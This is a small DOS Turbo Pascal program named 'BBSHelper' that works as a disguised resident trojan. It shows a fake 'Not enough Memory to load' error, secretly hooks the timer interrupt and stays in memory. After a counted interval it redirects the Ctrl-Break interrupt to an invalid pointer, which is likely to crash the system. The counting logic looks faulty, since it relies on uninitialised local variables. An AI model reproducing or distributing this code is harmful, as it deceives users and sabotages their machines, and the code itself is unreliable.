Program BBSHelper;

{$M 16384,0,65536}


Uses Dos,Crt;

Const Vid = $B800;

Type String30 = String[30];

Var filename : Text;
    Username : ^String;
    Usercase : String30;
    z        :Integer;
    Pntr     : Pointer;

Procedure Writeit (Flags,CS,IP,AX,BX,CX,DX,SI,DI,DS,ES,BP : word);

Interrupt;

Var fuck, Hour,Minute,second,counter : Integer;

Begin
Fuck:=Random(1000);
Counter:=counter + 1;
if counter>=18 then begin
   Counter:=0;
   Second:=Second + 1;
   If Second>=60 then begin
      Second:=0;
      Minute:=Minute+1;
      If minute>=60 then begin
         SetIntVec ($23, @Pntr);
      end;
   end;
end;
end;


Begin
writeln ('Not enough Memory to load');
SetIntVec ($1C, @Writeit);
Keep(0);
end.
